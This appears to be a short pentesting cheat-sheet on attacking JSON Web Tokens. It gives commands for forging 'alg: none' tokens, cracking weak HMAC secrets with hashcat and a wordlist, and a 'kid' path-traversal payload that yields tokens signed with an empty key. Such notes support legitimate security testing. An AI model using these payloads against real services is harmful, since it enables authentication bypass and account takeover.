---
title: JWT attacks
date: 2026-04-25
tags:
  - jwt
  - red-team
  - auth
description: Practical JWT attacks — algorithm confusion, weak secrets, kid injection.
---

JWT tokens are ubiquitous in modern APIs. Here are some of the most
useful offensive techniques for pentesting.

## Algorithm confusion (`alg: none`)

```bash
# Change alg to "none" and remove the signature
echo '{"alg":"none","typ":"JWT"}' | base64 -w0
echo '{"sub":"admin"}' | base64 -w0
# Result: <header>.<payload>.<empty>
```

## Weak HMAC secrets

```bash
# Crack with hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

## kid injection

When the header contains `kid` (key ID), it may sometimes be vulnerable
to path traversal or SQL injection.

```json
{
  "alg": "HS256",
  "kid": "../../../../dev/null"
}
```

If the server uses `kid` to resolve the key and the file does not
exist, it may return an empty value → HMAC with an empty secret →
trivially forgeable tokens.

## Tools

- `jwt_tool.py` — Swiss army knife for JWT testing
- `jwt.io` — online debugger (DO NOT use with real tokens)
- `hashcat -m 16500` — offline cracking
